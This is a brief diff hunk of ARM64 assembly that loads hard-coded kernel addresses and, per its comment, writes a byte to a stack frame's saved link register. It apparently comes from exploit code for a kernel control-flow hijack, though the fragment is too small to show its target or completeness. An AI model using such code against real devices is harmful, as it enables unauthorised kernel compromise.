@@ -80,7 +80,7 @@ B.MI .loop
 // value: 0xffffffffc000a830
 LDR X10, =0xffffffffc0019bb8+1
 NOP
-//LDR X10, =0xffffffffc0019bba
+
 // write a byte to stack frame saved LR
 MOV X0, #0
 ADD X1, X10, #0
